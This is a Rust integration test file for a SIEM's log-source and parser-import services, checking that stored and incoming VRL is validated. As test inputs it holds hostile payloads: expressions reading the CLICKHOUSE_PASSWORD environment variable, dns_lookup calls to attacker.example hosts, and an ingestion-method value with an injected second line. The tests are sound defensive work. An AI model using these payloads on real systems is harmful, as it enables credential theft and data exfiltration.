// SPDX-License-Identifier: AGPL-3.0-or-later

//! NAN-5012 / NAN-5033 / NAN-5057 against a real, fully migrated PostgreSQL
//! (and the ClickHouse `DualPool` requires): the write paths refuse hostile
//! VRL, and the publication render degrades a stored hostile row per source
//! and tells the operator why.
//!
//! Needs a THROWAWAY database: `NANOSIEM_TEST_DATABASE_URL`,
//! `NANOSIEM_TEST_CLICKHOUSE_URL` and `NANOSIEM_ALLOW_DESTRUCTIVE_TESTS=1`.
//! `#[ignore]`d like every DB-backed suite; run with `-- --ignored`.

use std::sync::Arc;

use nanosiem_core::auth::TargetGrants;
use nanosiem_core::db::{DualPool, DualPoolConfig};
use nanosiem_core::log_sources::{
    LogSourceService, LogSourceServiceError, NewLogSource, UpdateLogSource,
};
use nanosiem_core::parser_repository::{ParserImportRequest, ParserImportType, ParserRepositoryService};
use nanosiem_core::parsers::vrl_safety::QUARANTINE_NOTE_PREFIX;
use nanosiem_core::parsers::{ParserService, VectorConfigManager};
use sqlx::PgPool;
use tempfile::TempDir;
use uuid::Uuid;

struct Ctx {
    pg: PgPool,
    sources: LogSourceService,
    _vector_dir: TempDir,
}

async fn ctx() -> Ctx {
    let url = std::env::var("NANOSIEM_TEST_DATABASE_URL")
        .expect("NANOSIEM_TEST_DATABASE_URL (a throwaway postgres)");
    let ch = std::env::var("NANOSIEM_TEST_CLICKHOUSE_URL")
        .expect("NANOSIEM_TEST_CLICKHOUSE_URL (a throwaway clickhouse)");
    assert_eq!(
        std::env::var("NANOSIEM_ALLOW_DESTRUCTIVE_TESTS").as_deref(),
        Ok("1"),
        "refusing to run against a database without NANOSIEM_ALLOW_DESTRUCTIVE_TESTS=1"
    );
    let mut config = DualPoolConfig::with_auth(url, ch, "nanosiem", "default", "");
    // The raw-SQL identities are required at boot (NAN-2001); this suite never
    // uses them, so placeholders keep the throwaway ClickHouse untouched.
    config.clickhouse_rawsql_password = Some("unused".into());
    config.clickhouse_rawsql_noaudit_password = Some("unused".into());
    let dual = DualPool::new(&config).await.expect("dual pool");
    let pg = dual.postgres().clone();
    nanosiem_core::db::run_postgres_migrations(&pg)
        .await
        .expect("migrations");
    let dir = TempDir::new().unwrap();
    let vector = Arc::new(VectorConfigManager::new(dir.path()));
    Ctx {
        sources: LogSourceService::with_dual_pool_and_vector_config(&dual, vector),
        pg,
        _vector_dir: dir,
    }
}

fn source(name: &str) -> NewLogSource {
    NewLogSource {
        name: name.into(),
        description: None,
        namespace: "default".into(),
        timezone: "UTC".into(),
        source_type: "routed".into(),
        parser_vrl: ".parsed = true".into(),
        output_fields: None,
        dispatch_source_config_id: None,
        category: None,
        vendor: None,
        product: None,
        icon: None,
        color: None,
        match_field: None,
        match_pattern: None,
        match_values: Some(vec![format!("{}_key", name.to_lowercase().replace(' ', "_"))]),
        sampling_ratio: None,
        sampling_exclude_condition: None,
        lifecycle_status: None,
    }
}

fn unique(prefix: &str) -> String {
    format!("{prefix} {}", &Uuid::new_v4().simple().to_string()[..8])
}

const LEAK: &str = r#"get_env_var!("CLICKHOUSE_PASSWORD") != """#;

/// Finding #5: create and update refuse a hostile exclude condition; an
/// ordinary one (the docs example) is accepted and can be cleared again.
#[tokio::test]
#[ignore = "needs a throwaway PostgreSQL + ClickHouse"]
async fn sampling_condition_is_checked_on_create_and_update() {
    let c = ctx().await;

    let mut hostile = source(&unique("Sampling create"));
    hostile.sampling_ratio = Some(0.5);
    hostile.sampling_exclude_condition = Some(LEAK.into());
    assert!(matches!(
        c.sources.create(hostile).await,
        Err(LogSourceServiceError::InvalidVrl(m)) if m.starts_with("sampling_exclude_condition:")
    ));

    let created = c.sources.create(source(&unique("Sampling update"))).await.unwrap();
    for condition in [LEAK, r#"true) || dns_lookup!("x.attacker.example") != {} || (true"#] {
        let err = c
            .sources
            .update(
                created.id,
                UpdateLogSource {
                    sampling_ratio: Some(0.5),
                    sampling_exclude_condition: Some(condition.into()),
                    ..Default::default()
                },
            )
            .await
            .unwrap_err();
        assert!(matches!(err, LogSourceServiceError::InvalidVrl(_)), "{condition}: {err}");
    }
    let ok = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                sampling_ratio: Some(0.5),
                sampling_exclude_condition: Some(r#".action != "allow""#.into()),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert_eq!(ok.sampling_exclude_condition.as_deref(), Some(r#".action != "allow""#));
    // The UI clears the field by sending "" (NAN-5012 UI fix).
    let cleared = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                sampling_exclude_condition: Some(String::new()),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert_eq!(cleared.sampling_exclude_condition.as_deref().unwrap_or(""), "");
}

/// NAN-5057: a PUT that saves blocked-function VRL and enables the source in
/// one request no longer skips the `enable()` gate.
#[tokio::test]
#[ignore = "needs a throwaway PostgreSQL + ClickHouse"]
async fn enabling_in_the_same_put_as_invalid_vrl_is_refused() {
    let c = ctx().await;
    let created = c.sources.create(source(&unique("Enable gate"))).await.unwrap();
    c.sources.disable(created.id).await.unwrap();

    let err = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                parser_vrl: Some(r#".ext.leak = get_env_var!("CLICKHOUSE_PASSWORD")"#.into()),
                enabled: Some(true),
                ..Default::default()
            },
        )
        .await
        .unwrap_err();
    assert!(matches!(err, LogSourceServiceError::NotValidated), "{err}");
    let row: (bool,) = sqlx::query_as("SELECT enabled FROM log_sources WHERE id = $1")
        .bind(created.id)
        .fetch_one(&c.pg)
        .await
        .unwrap();
    assert!(!row.0, "the source must stay disabled");

    // A valid VRL + enable in one PUT keeps working.
    let ok = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                parser_vrl: Some(".parsed = \"yes\"".into()),
                enabled: Some(true),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert!(ok.enabled && ok.validated);

    // Re-sending `enabled: true` for an already-enabled source is not a
    // transition and stays accepted (whole-object PUT clients).
    c.sources
        .update(
            created.id,
            UpdateLogSource {
                enabled: Some(true),
                description: Some("still fine".into()),
                ..Default::default()
            },
        )
        .await
        .unwrap();
}

/// NAN-5057: an extension-only edit is part of the source's validity.
#[tokio::test]
#[ignore = "needs a throwaway PostgreSQL + ClickHouse"]
async fn extension_edit_updates_validation_status() {
    let c = ctx().await;
    let created = c.sources.create(source(&unique("Extension"))).await.unwrap();
    let bad = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                extension_vrl: Some(r#".ext.x = dns_lookup!("a.attacker.example")"#.into()),
                extension_enabled: Some(true),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert!(!bad.validated);
    assert!(bad.validation_error.unwrap_or_default().contains("extension_vrl"));
    let good = c
        .sources
        .update(
            created.id,
            UpdateLogSource {
                extension_vrl: Some(".ext.x = 1".into()),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert!(good.validated, "{:?}", good.validation_error);
}

/// NAN-5012 / NAN-5057: a stored hostile row (legacy, or written before
/// these checks) never fails the publication render; the operator sees why on
/// the source's validation banner, and the note clears once the row is fixed.
#[tokio::test]
#[ignore = "needs a throwaway PostgreSQL + ClickHouse"]
async fn render_degrades_a_stored_hostile_row_and_records_why() {
    let c = ctx().await;
    let created = c.sources.create(source(&unique("Legacy hostile"))).await.unwrap();
    // Write the legacy state directly, as a pre-fix row would hold it.
    sqlx::query(
        "UPDATE log_sources SET enabled = true, sampling_ratio = 0.5, sampling_exclude_condition = $2 WHERE id = $1",
    )
    .bind(created.id)
    .bind(LEAK)
    .execute(&c.pg)
    .await
    .unwrap();

    let dir = TempDir::new().unwrap();
    let parsers = ParserService::with_vector_config_dir(c.pg.clone(), dir.path());
    parsers
        .render_to_vector_config()
        .await
        .expect("the render must not fail because of one row");
    let note: (Option<String>,) =
        sqlx::query_as("SELECT validation_error FROM log_sources WHERE id = $1")
            .bind(created.id)
            .fetch_one(&c.pg)
            .await
            .unwrap();
    let note = note.0.expect("the operator is told");
    assert!(note.starts_with(QUARANTINE_NOTE_PREFIX), "{note}");
    assert!(note.contains("Sampling paused"), "{note}");
    // Per-source files only: `_pipeline.toml` legitimately references
    // nano's own `${CLICKHOUSE_PASSWORD}`.
    for entry in std::fs::read_dir(dir.path().join("sources/parsers"))
        .unwrap()
        .flatten()
        .filter(|e| !e.file_name().to_string_lossy().starts_with('_'))
    {
        let text = std::fs::read_to_string(entry.path()).unwrap();
        assert!(!text.contains("CLICKHOUSE_PASSWORD"), "{}", entry.path().display());
    }

    sqlx::query("UPDATE log_sources SET sampling_exclude_condition = '' WHERE id = $1")
        .bind(created.id)
        .execute(&c.pg)
        .await
        .unwrap();
    parsers.render_to_vector_config().await.unwrap();
    let note: (Option<String>,) =
        sqlx::query_as("SELECT validation_error FROM log_sources WHERE id = $1")
            .bind(created.id)
            .fetch_one(&c.pg)
            .await
            .unwrap();
    assert_eq!(note.0, None, "the note clears once the row is fixed");
}

async fn repo_parser(pg: &PgPool, vrl: &str) -> (Uuid, String) {
    // One first-party repository row may exist (unique on the normalized
    // URL); reuse it when migrations or an earlier test created it.
    sqlx::query(
        "INSERT INTO parser_repositories (name, slug, url) VALUES ($1, $1, 'https://github.com/nano-rs/parsers') \
         ON CONFLICT DO NOTHING",
    )
    .bind(unique("repo"))
    .execute(pg)
    .await
    .unwrap();
    let repo: (Uuid,) = sqlx::query_as(
        "SELECT id FROM parser_repositories WHERE url ILIKE '%nano-rs/parsers%' ORDER BY created_at LIMIT 1",
    )
    .fetch_one(pg)
    .await
    .unwrap();
    let path = format!("p{}/parser.yaml", &Uuid::new_v4().simple().to_string()[..8]);
    let name = format!("imp_{}", &Uuid::new_v4().simple().to_string()[..8]);
    sqlx::query(
        "INSERT INTO repository_parsers (repository_id, file_path, raw_content, name, display_name, parser_vrl) \
         VALUES ($1, $2, $3, $4, $4, $5)",
    )
    .bind(repo.0)
    .bind(&path)
    .bind(format!("name: {name}\nvrl: |\n  {vrl}\n"))
    .bind(&name)
    .bind(vrl)
    .execute(pg)
    .await
    .unwrap();
    (repo.0, path)
}

/// Finding #26 + NAN-5057 on the repository import path.
#[tokio::test]
#[ignore = "needs a throwaway PostgreSQL + ClickHouse"]
async fn import_refuses_unknown_ingestion_method_and_records_real_validity() {
    let c = ctx().await;
    let service = ParserRepositoryService::new(c.pg.clone());
    let grants = TargetGrants::system();

    let (repo, path) = repo_parser(&c.pg, ".parsed = true").await;
    let hostile = ParserImportRequest {
        import_type: ParserImportType::Forked,
        source_type: None,
        ingestion_method: Some(
            "routed\"\n.ext.leak = get_env_var!(\"CLICKHOUSE_PASSWORD\")\n#".into(),
        ),
        dispatch_source_config_id: None,
    };
    let err = service
        .import_parser(repo, &path, &hostile, None, &grants)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("not a supported ingestion method"), "{err}");
    let leaked: (i64,) =
        sqlx::query_as("SELECT count(*) FROM log_sources WHERE source_type LIKE '%get_env_var%'")
            .fetch_one(&c.pg)
            .await
            .unwrap();
    assert_eq!(leaked.0, 0, "no row is created");

    // The UI's OTLP choice still imports (the issue's suggested
    // `SourceType::from_str` check would have refused it).
    let otlp = ParserImportRequest {
        ingestion_method: Some("otlp".into()),
        ..hostile.clone()
    };
    let imported = service
        .import_parser(repo, &path, &otlp, None, &grants)
        .await
        .expect("otlp import");
    let row: (String, bool) =
        sqlx::query_as("SELECT source_type, validated FROM log_sources WHERE id = $1")
            .bind(imported.log_source_id)
            .fetch_one(&c.pg)
            .await
            .unwrap();
    assert_eq!(row, ("otlp".to_string(), true));

    // Repository VRL that calls a blocked function lands unvalidated (it was
    // stored `validated = true` before).
    let (repo, path) = repo_parser(&c.pg, r#".ext.leak = get_env_var!("CLICKHOUSE_PASSWORD")"#).await;
    let routed = ParserImportRequest {
        ingestion_method: None,
        ..hostile
    };
    let imported = service
        .import_parser(repo, &path, &routed, None, &grants)
        .await
        .expect("import lands");
    let row: (bool, Option<String>) =
        sqlx::query_as("SELECT validated, validation_error FROM log_sources WHERE id = $1")
            .bind(imported.log_source_id)
            .fetch_one(&c.pg)
            .await
            .unwrap();
    assert!(!row.0, "a blocked-function import is not validated");
    assert!(row.1.unwrap_or_default().contains("parser_vrl"));
}
